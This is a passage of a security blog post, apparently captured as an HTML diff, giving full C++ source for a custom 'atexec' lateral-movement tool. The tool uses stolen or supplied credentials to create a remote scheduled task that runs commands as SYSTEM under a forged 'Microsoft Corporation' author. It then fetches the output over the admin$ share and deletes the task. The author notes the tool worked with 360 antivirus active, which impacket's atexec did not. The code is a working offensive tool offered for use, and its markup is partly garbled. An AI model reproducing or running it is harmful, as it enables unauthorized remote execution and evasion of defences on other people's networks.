+<span class="n">BOOL</span> <span class="nf">ConnectTaskServer</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsHost</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwDomain</span><span class="p">,</span><span class="n">LPCWSTR</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">// 初始化COM组件</span>
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">CoInitializeEx</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">COINIT_MULTITHREADED</span><span class="p">);</span>
+	<span class="c1">// 设置组件安全等级</span>
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">CoInitializeSecurity</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">RPC_C_AUTHN_LEVEL_PKT_PRIVACY</span><span class="p">,</span> <span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="c1">// 创建任务服务容器</span>
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">CLSID_TaskScheduler</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="n">IID_ITaskService</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pService</span><span class="p">);</span>
+	<span class="c1">// 连接目标服务器为远程连接或本地服务器</span>
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">pService</span><span class="o">-&gt;</span><span class="n">Connect</span><span class="p">(</span><span class="n">_variant_t</span><span class="p">(</span><span class="n">lpwsHost</span><span class="p">),</span> <span class="n">_variant_t</span><span class="p">(</span><span class="n">lpwsUserName</span><span class="p">),</span> <span class="n">_variant_t</span><span class="p">(</span><span class="n">lpwDomain</span><span class="p">),</span> <span class="n">_variant_t</span><span class="p">(</span><span class="n">lpwsPassword</span><span class="p">));</span>	<span class="c1">//默认本地</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hr</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"ITaskService::Connect failed: %x </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hr</span><span class="p">);</span>
+		
+		<span class="n">pService</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+		<span class="n">CoUninitialize</span><span class="p">();</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">DWORD</span> <span class="nf">ConnectSMBServer</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsHost</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// 用于存放SMB共享资源格式</span>
+	<span class="n">PWCHAR</span> <span class="n">lpwsIPC</span> <span class="o">=</span> <span class="k">new</span> <span class="n">WCHAR</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+	<span class="n">DWORD</span> <span class="n">dwRetVal</span><span class="p">;</span> <span class="c1">// 函数返回值</span>
+	<span class="n">NETRESOURCE</span> <span class="n">nr</span><span class="p">;</span> <span class="c1">// 连接的详细信息</span>
+	<span class="n">DWORD</span> <span class="n">dwFlags</span><span class="p">;</span> <span class="c1">// 连接选项</span>
+
+	<span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">NETRESOURCE</span><span class="p">));</span>
+	<span class="n">swprintf</span><span class="p">(</span><span class="n">lpwsIPC</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"\%s</span><span class="se">\a</span><span class="s">dmin$"</span><span class="p">),</span> <span class="n">lpwsHost</span><span class="p">);</span>
+	<span class="n">nr</span><span class="p">.</span><span class="n">dwType</span> <span class="o">=</span> <span class="n">RESOURCETYPE_ANY</span><span class="p">;</span> <span class="c1">// 枚举所有资源</span>
+	<span class="n">nr</span><span class="p">.</span><span class="n">lpLocalName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">nr</span><span class="p">.</span><span class="n">lpRemoteName</span> <span class="o">=</span> <span class="n">lpwsIPC</span><span class="p">;</span> <span class="c1">// 资源的网络名</span>
+	<span class="n">nr</span><span class="p">.</span><span class="n">lpProvider</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="c1">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。</span>
+	<span class="n">dwFlags</span> <span class="o">=</span> <span class="n">CONNECT_UPDATE_PROFILE</span><span class="p">;</span>
+
+	<span class="n">dwRetVal</span> <span class="o">=</span> <span class="n">WNetAddConnection2</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nr</span><span class="p">,</span> <span class="n">lpwsPassword</span><span class="p">,</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">dwFlags</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">dwRetVal</span> <span class="o">==</span> <span class="n">NO_ERROR</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">// 返回NO_ERROR则成功</span>
+		<span class="c1">// wprintf(L"Connection added to %s\n", nr.lpRemoteName);</span>
+		<span class="k">return</span> <span class="n">dwRetVal</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">wprintf</span><span class="p">(</span><span class="s">L"WNetAddConnection2 failed with error: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwRetVal</span><span class="p">);</span>
+	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="nf">GetSMBServerFileContent</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsDstPath</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">DWORD</span> <span class="n">dwFileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">PCHAR</span> <span class="n">readBuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">DWORD</span> <span class="n">dwReaded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">BOOL</span> <span class="n">bRet</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">lpwsDstPath</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"Can't Read File : %s </span><span class="se">\n</span><span class="s">"</span><span class="p">),</span> <span class="n">lpwsDstPath</span><span class="p">);</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="c1">// 获取文件大小</span>
+	<span class="n">dwFileSize</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="n">readBuf</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">dwFileSize</span><span class="p">);</span>
+	<span class="n">ReadFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">dwFileSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReaded</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"===========================</span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">);</span>
+	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+	<span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_NO_SERIALIZE</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">);</span>
+	<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">===========================</span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 获取未来10秒后的时间</span>
+<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="nf">GetTime</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">WCHAR</span> <span class="n">CurrentTime</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+	<span class="n">SYSTEMTIME</span> <span class="n">sys</span><span class="p">;</span>
+	<span class="n">GetLocalTime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sys</span><span class="p">);</span>
+	<span class="n">sys</span><span class="p">.</span><span class="n">wSecond</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">wSecond</span> <span class="o">&gt;=</span> <span class="mi">60</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">sys</span><span class="p">.</span><span class="n">wMinute</span><span class="o">++</span><span class="p">;</span>
+		<span class="n">sys</span><span class="p">.</span><span class="n">wSecond</span> <span class="o">-=</span> <span class="mi">60</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">wsprintf</span><span class="p">(</span><span class="n">CurrentTime</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"%4d-%02d-%02dT%02d:%02d:%02d"</span><span class="p">),</span> <span class="n">sys</span><span class="p">.</span><span class="n">wYear</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wMonth</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wDay</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wHour</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wMinute</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wSecond</span><span class="p">);</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">returnTime</span><span class="p">(</span><span class="n">CurrentTime</span><span class="p">);</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="n">returnTime</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+	<span class="k">return</span> <span class="n">returnTime</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="nf">CreatTask</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">wTaskName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">wCommand</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">wOutPutPath</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">CurrentTime</span><span class="p">;</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">CommandArgs</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"/c "</span><span class="p">));</span>
+	<span class="n">CommandArgs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">wCommand</span><span class="p">);</span>
+	<span class="n">CommandArgs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">" &gt;"</span><span class="p">));</span>
+	<span class="n">CommandArgs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">wOutPutPath</span><span class="p">);</span>
+
+	<span class="n">wstring</span> <span class="n">wstrExePath</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"C:\Windows\System32\cmd.exe"</span><span class="p">));</span>
+	
+	<span class="c1">// 获取任务文件夹并在其中创建任务</span>
+	<span class="n">pService</span><span class="o">-&gt;</span><span class="n">GetFolder</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"\Microsoft\Windows\AppID"</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pRootFolder</span><span class="p">);</span>
+	<span class="c1">// 如果存在同名任务，删除它</span>
+	<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">DeleteTask</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">wTaskName</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="c1">// 使用ITaskDefinition对象定义任务相关信息</span>
+	<span class="n">ITaskDefinition</span><span class="o">*</span> <span class="n">pTask</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pService</span><span class="o">-&gt;</span><span class="n">NewTask</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pTask</span><span class="p">);</span>
+
+	<span class="c1">// 使用IRegistrationInfo对象对任务的基础信息填充</span>
+	<span class="n">IRegistrationInfo</span><span class="o">*</span> <span class="n">pRegInfo</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_RegistrationInfo</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pRegInfo</span><span class="p">);</span>
+	<span class="n">pRegInfo</span><span class="o">-&gt;</span><span class="n">put_Author</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"Microsoft Corporation"</span><span class="p">));</span>
+
+	<span class="c1">// 创建任务的安全凭证</span>
+	<span class="n">IPrincipal</span><span class="o">*</span> <span class="n">pPrincipal</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_Principal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pPrincipal</span><span class="p">);</span>
+
+	<span class="c1">// 设置规则为交互式登录</span>
+	<span class="n">pPrincipal</span><span class="o">-&gt;</span><span class="n">put_LogonType</span><span class="p">(</span><span class="n">TASK_LOGON_INTERACTIVE_TOKEN</span><span class="p">);</span>
+
+	<span class="n">pPrincipal</span><span class="o">-&gt;</span><span class="n">put_UserId</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"NT AUTHORITY\SYSTEM"</span><span class="p">));</span>
+
+	<span class="c1">// 创建任务的设置信息</span>
+	<span class="n">ITaskSettings</span><span class="o">*</span> <span class="n">pTaskSettings</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_Settings</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pTaskSettings</span><span class="p">);</span>
+	<span class="c1">// 为设置信息赋值</span>
+	<span class="n">pTaskSettings</span><span class="o">-&gt;</span><span class="n">put_StartWhenAvailable</span><span class="p">(</span><span class="n">VARIANT_TRUE</span><span class="p">);</span>
+	<span class="c1">// 设置任务的idle设置</span>
+	<span class="n">IIdleSettings</span><span class="o">*</span> <span class="n">pIdleSettings</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTaskSettings</span><span class="o">-&gt;</span><span class="n">get_IdleSettings</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pIdleSettings</span><span class="p">);</span>
+	<span class="n">pIdleSettings</span><span class="o">-&gt;</span><span class="n">put_WaitTimeout</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"PT1M"</span><span class="p">));</span>
+
+	<span class="c1">//创建触发器</span>
+	<span class="n">ITriggerCollection</span><span class="o">*</span> <span class="n">pTriggerCollection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_Triggers</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pTriggerCollection</span><span class="p">);</span>
+	<span class="n">ITrigger</span><span class="o">*</span> <span class="n">pTrigger</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">pTriggerCollection</span><span class="o">-&gt;</span><span class="n">Create</span><span class="p">(</span><span class="n">TASK_TRIGGER_TIME</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pTrigger</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hr</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Cannot create the trigger: %x"</span><span class="p">,</span> <span class="n">hr</span><span class="p">);</span>
+		<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+		<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+		<span class="n">CoUninitialize</span><span class="p">();</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="c1">// 设置时间触发器</span>
+	<span class="n">ITimeTrigger</span><span class="o">*</span> <span class="n">pTimeTrigger</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTrigger</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span><span class="n">IID_ITimeTrigger</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pTimeTrigger</span><span class="p">);</span>
+	<span class="n">pTimeTrigger</span><span class="o">-&gt;</span><span class="n">put_Id</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"Trigger2"</span><span class="p">));</span>
+	<span class="n">CurrentTime</span> <span class="o">=</span> <span class="n">GetTime</span><span class="p">();</span>
+	<span class="c1">// 在10秒后执行</span>
+	<span class="n">pTimeTrigger</span><span class="o">-&gt;</span><span class="n">put_StartBoundary</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">CurrentTime</span><span class="p">.</span><span class="n">data</span><span class="p">()));</span>
+	<span class="n">pTimeTrigger</span><span class="o">-&gt;</span><span class="n">put_EndBoundary</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"2089-03-26T13\:00\:00"</span><span class="p">));</span>
+	<span class="c1">// 创建任务动作</span>
+	<span class="n">IActionCollection</span><span class="o">*</span> <span class="n">pActionCollection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_Actions</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pActionCollection</span><span class="p">);</span>
+	<span class="n">IAction</span><span class="o">*</span> <span class="n">pAction</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pActionCollection</span><span class="o">-&gt;</span><span class="n">Create</span><span class="p">(</span><span class="n">TASK_ACTION_EXEC</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pAction</span><span class="p">);</span>
+	<span class="n">IExecAction</span><span class="o">*</span> <span class="n">pExecAction</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="c1">// 出入执行命令及参数</span>
+	<span class="n">pAction</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span><span class="n">IID_IExecAction</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pExecAction</span><span class="p">);</span>
+	<span class="n">pExecAction</span><span class="o">-&gt;</span><span class="n">put_Path</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">wstrExePath</span><span class="p">.</span><span class="n">c_str</span><span class="p">()));</span>
+	<span class="n">pExecAction</span><span class="o">-&gt;</span><span class="n">put_Arguments</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">CommandArgs</span><span class="p">.</span><span class="n">data</span><span class="p">()));</span>
+
+	<span class="n">IRegisteredTask</span><span class="o">*</span> <span class="n">pRegistredTask</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">RegisterTaskDefinition</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">wTaskName</span><span class="p">),</span> <span class="n">pTask</span><span class="p">,</span> <span class="n">TASK_CREATE_OR_UPDATE</span><span class="p">,</span>
+		<span class="n">_variant_t</span><span class="p">(),</span> <span class="n">_variant_t</span><span class="p">(),</span> <span class="n">TASK_LOGON_INTERACTIVE_TOKEN</span><span class="p">,</span> <span class="n">_variant_t</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">pRegistredTask</span><span class="p">);</span>
+	<span class="n">Sleep</span><span class="p">(</span><span class="mi">10</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">);</span>
+	<span class="c1">// 结束时删除任务</span>
+	<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">DeleteTask</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">wTaskName</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+	<span class="n">pService</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+	<span class="n">CoUninitialize</span><span class="p">();</span>
+	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">_cdecl</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="n">BOOL</span> <span class="n">bRetVal</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="n">WCHAR</span> <span class="n">wsTaskName</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"TestBody"</span><span class="p">);</span>
+	<span class="n">LPCWSTR</span> <span class="n">lpwDomain</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"atexec.exe &lt;Host&gt; &lt;Username&gt; &lt;Password&gt; &lt;Command&gt; [Domain] </span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+		<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"Usage: </span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+		<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"atexec.exe 192.168.3.130 Administrator 123456 whoami SYS.LOCAL</span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+		<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"atexec.exe 192.168.3.130 Administrator 123456 whoami</span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">lpwDomain</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="c1">// 域名</span>
+	<span class="p">}</span>
+	<span class="n">LPCWSTR</span> <span class="n">wsCommand</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// 执行命令</span>
+	<span class="n">LPCWSTR</span> <span class="n">lpwsHost</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// 目标机器地址</span>
+	<span class="n">LPCWSTR</span> <span class="n">lpwsUserName</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// 账号</span>
+	<span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// 密码</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">wsHostFile</span><span class="p">;</span>
+	<span class="n">WCHAR</span> <span class="n">wsOutPutPath</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"C:\Windows\RunTime.log"</span><span class="p">);</span>
+	<span class="n">wsHostFile</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">));</span><span class="err">
+</span><span class="s">	wsHostFile.append(lpwsHost);</span><span class="err">
+</span><span class="s">	wsHostFile.append(TEXT("</span><span class="err">\</span><span class="n">admin</span><span class="err">$\</span><span class="n">RunTime</span><span class="p">.</span><span class="n">log</span><span class="s">"));</span><span class="err">
+</span><span class="s">	// 连接任务计划</span><span class="err">
+</span><span class="s">	bRetVal = ConnectTaskServer(lpwsHost, NULL, lpwsUserName, lpwsPassword);</span><span class="err">
+</span><span class="s">	if (!bRetVal) {</span><span class="err">
+</span><span class="s">		return -1;</span><span class="err">
+</span><span class="s">	}</span><span class="err">
+
+</span><span class="s">	bRetVal = CreatTask(wsTaskName, wsCommand, wsOutPutPath);</span><span class="err">
+</span><span class="s">	if (!bRetVal) {</span><span class="err">
+</span><span class="s">		return -1;</span><span class="err">
+</span><span class="s">	}</span><span class="err">
+</span><span class="s">	// 连接目标服务器SMB</span><span class="err">
+</span><span class="s">	if (ConnectSMBServer(lpwsHost, lpwsUserName, lpwsPassword) == 0) {</span><span class="err">
+</span><span class="s">		// 连接成功</span><span class="err">
+</span><span class="s">		GetSMBServerFileContent(wsHostFile.data());</span><span class="err">
+</span><span class="s">	}</span><span class="err">
+</span><span class="s">	else {</span><span class="err">
+</span><span class="s">		std::wcout &lt;&lt; TEXT("</span><span class="n">Can</span><span class="err">'</span><span class="n">t</span> <span class="n">Connect</span> <span class="n">to</span> <span class="s">") &lt;&lt; lpwsHost &lt;&lt; std::endl;</span><span class="err">
+</span><span class="s">	}</span><span class="err">
+
+</span><span class="s">	return 0;</span><span class="err">
+</span><span class="s">}</span><span class="err">
+</span></code></pre></div></div>
+
+<h2 id="0x05-其他atexec">0x05 其他Atexec</h2>
+
+<p><strong><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">impacket-atexec.py</a></strong> 是基于impacket库实现了MS-TSCH协议（只走445端口）来进行横向的脚本。</p>
+
+<p>在我测试的过程中，Windows Server 2008上安装了360安全卫士后，横向无法取回结果，关闭360安全卫士后，成功执行，但我自己写的atexec就能够在360安全卫士开启的状态下完成命令执行、命令结果取回。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b9d665e24c38810cece969d9dcc3d80c.png" alt="2020-06-28-22-04-33"></p>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
